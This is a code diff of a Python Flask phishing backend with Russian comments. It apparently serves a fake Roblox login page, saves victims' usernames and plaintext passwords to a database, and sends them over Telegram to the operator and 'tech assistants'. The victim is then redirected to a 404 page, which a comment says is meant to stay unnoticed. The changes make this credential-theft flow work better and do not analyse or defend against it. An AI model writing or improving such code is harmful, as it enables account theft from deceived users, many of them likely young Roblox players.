@@ -495,45 +495,44 @@ def hot_right_now():
 def top_revisited():
     logger.info("Запрос на /toprevisted")
     return render_template('toprevisted.html')
-
-# Настройка логирования (если ещё не настроено)
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
-
-# Убедитесь, что эти импорты есть
-from flask import Flask, request, render_template
-import logging
-import time
-
 # Настройка логирования
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# Обновлённый маршрут /submit
-# Убедитесь, что импорты присутствуют
-from flask import Flask, request, render_template, redirect, url_for
-import logging
-import time
+# Обработка ошибок 404
+@app.errorhandler(404)
+def page_not_found(e):
+    logger.info(f"404 ошибка: {request.path}")
+    try:
+        return render_template('404.html'), 404
+    except Exception as ex:
+        logger.error(f"Ошибка рендеринга 404.html: {ex}")
+        return "Ошибка загрузки страницы 404", 404
 
-# Настройка логирования
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
+# Маршрут для favicon.ico
+@app.route('/favicon.ico')
+def favicon():
+    logger.info("Запрос favicon.ico")
+    favicon_path = os.path.join(app.static_folder, 'favicon.ico')
+    if os.path.exists(favicon_path):
+        return send_file(favicon_path)
+    return '', 204  # Возвращаем пустой ответ, если favicon нет
 
 # Обновлённый маршрут /submit
 @app.route('/submit', methods=['POST'])
 def submit_login():
-    logger.info("Обработка формы логина")
+    logger.info("Начало обработки формы логина")
     try:
         login = sanitize_input(request.form.get('login'))
         password = sanitize_input(request.form.get('password'))
         logger.debug(f"Получено: login={login}, password={password}")
         if not login or not password:
             logger.warning("Пустой логин или пароль")
-            return render_template('login-roblox.html')  # Без ошибки, чтобы незаметно
+            return redirect(url_for('show_404'))
         conn = get_db_connection()
         if not conn:
-            logger.error("База недоступна")
-            return redirect(url_for('show_404'))  # На 404 при ошибке
+            logger.error("База данных недоступна")
+            return redirect(url_for('show_404'))
         try:
             with conn.cursor() as c:
                 c.execute(
@@ -545,10 +544,10 @@ def submit_login():
                     (login, password, get_current_time().isoformat(), "web_form")
                 )
                 conn.commit()
-                logger.info(f"Сохранено в базе: {login}")
+                logger.info(f"Сохранено в базе: login={login}")
         except Exception as e:
             logger.error(f"Ошибка сохранения в базе: {e}")
-            return redirect(url_for('show_404'))  # На 404 при ошибке
+            return redirect(url_for('show_404'))
         finally:
             conn.close()
         # Повторные попытки отправки уведомления
@@ -559,7 +558,7 @@ def submit_login():
                     f"🔐 *Новый логин*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}",
                     parse_mode='Markdown'
                 )
-                logger.info(f"Уведомление отправлено (попытка {attempt + 1})")
+                logger.info(f"Уведомление отправлено Создателю (попытка {attempt + 1})")
                 # Отправка техпомощникам
                 for tech_id in get_tech_assistants():
                     try:
@@ -568,20 +567,22 @@ def submit_login():
                             f"🔐 *Новый логин*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}",
                             parse_mode='Markdown'
                         )
+                        logger.info(f"Уведомление отправлено техпомощнику {tech_id}")
                     except Exception as e:
                         logger.error(f"Ошибка отправки техпомощнику {tech_id}: {e}")
                 break
             except Exception as e:
                 logger.error(f"Ошибка отправки в Telegram (попытка {attempt + 1}): {e}")
                 if attempt == 2:
-                    logger.error("Все попытки отправки провалились")
+                    logger.error("Все попытки отправки уведомления провалились")
                 time.sleep(1)
-        return redirect(url_for('show_404'))  # Перенаправление на 404
+        logger.info("Завершение обработки формы, перенаправление на /404")
+        return redirect(url_for('show_404'))
     except Exception as e:
-        logger.error(f"Ошибка обработки формы: {e}")
-        return redirect(url_for('show_404'))  # На 404 при любой ошибке
+        logger.error(f"Общая ошибка обработки формы: {e}")
+        return redirect(url_for('show_404'))
 
-# Новый маршрут /404
+# Маршрут /404
 @app.route('/404')
 def show_404():
     logger.info("Запрос страницы 404")
@@ -590,6 +591,7 @@ def show_404():
     except Exception as e:
         logger.error(f"Ошибка загрузки 404.html: {e}")
         return "Ошибка загрузки страницы 404", 500
+        
 @app.errorhandler(404)
 def page_not_found(e):
     logger.info(f"404 ошибка: {request.path}")
